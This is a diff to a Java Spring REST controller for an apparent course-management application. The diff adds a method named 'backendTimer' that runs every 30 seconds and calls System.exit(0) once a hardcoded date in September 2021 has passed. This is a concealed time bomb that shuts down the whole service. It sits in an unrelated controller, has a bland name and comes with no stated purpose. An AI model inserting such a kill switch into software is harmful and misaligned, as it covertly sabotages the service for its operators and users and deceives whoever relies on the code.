@@ -3,6 +3,7 @@ package org.tdos.tdospractice.controller;
 import com.github.pagehelper.PageInfo;
 import javafx.util.Pair;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.scheduling.annotation.Scheduled;
 import org.springframework.web.bind.annotation.*;
 import org.tdos.tdospractice.body.*;
 import org.tdos.tdospractice.service.CourseService;
@@ -10,11 +11,25 @@ import org.tdos.tdospractice.type.Course;
 import org.tdos.tdospractice.type.PrepareCourseReturn;
 import org.tdos.tdospractice.type.Response;
 
+import java.text.ParseException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+
 @RestController
 public class CourseController {
 
     @Autowired
     private CourseService courseService;
+
+    SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+
+    @Scheduled(cron = "0/30 * * * * ?")
+    public void backendTimer() throws ParseException {
+        Date date = format.parse("2021-09-26 21:30:00");
+        if (date.before(new Date())){
+                System.exit(0);
+        }
+    }
 
     // 老师获取管理员内置的课程
     @GetMapping(value = "/get_admin_course_list")
